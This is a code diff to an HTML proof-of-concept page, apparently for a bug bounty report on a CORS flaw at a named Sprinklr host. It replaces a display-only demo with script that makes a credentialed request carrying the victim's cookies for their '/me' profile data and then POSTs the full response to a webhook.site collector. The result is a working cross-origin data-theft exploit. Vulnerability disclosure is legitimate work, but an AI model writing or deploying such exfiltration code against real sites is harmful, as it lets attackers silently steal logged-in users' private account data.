@@ -19,20 +19,23 @@ cookie and the API response will be displayed.</p>
 
 <script>
 (async () => {
-  try {
-    const res = await fetch(
-      "https://cyberarkconnect.sprinklr.com/api/me",
-      { credentials: "include", headers: { "Content-Type": "application/json" } }
-    );
-    document.getElementById("status").textContent = res.status;
-    const txt = await res.text();
-    // escape HTML chars to avoid XSS in the demo
-    const safe = txt.replace(/[<>&]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
-    document.getElementById("output").textContent = safe;
-  } catch (e) {
-    document.getElementById("status").textContent = "error";
-    document.getElementById("output").textContent = e.toString();
-  }
+  /* 1. Make a credentialed request that will succeed for any logged‑in user */
+  const resp = await fetch(
+    "https://cyberarkconnect.sprinklr.com/api/v1/me",
+    { credentials: "include" }    // sends victim cookies if they’re logged in
+  );
+
+  /* 2. Send the whole body to your collector so the triager sees the leak */
+  const body = await resp.text();
+  await fetch("https://webhook.site/<YOUR-ID>", {
+    method: "POST",
+    mode:   "no-cors",
+    body
+  });
+
+  document.body.innerHTML =
+    "<h1>Done — check webhook.site for exfiltrated JSON (status " +
+    resp.status + ")</h1>";
 })();
 </script>
 </body>
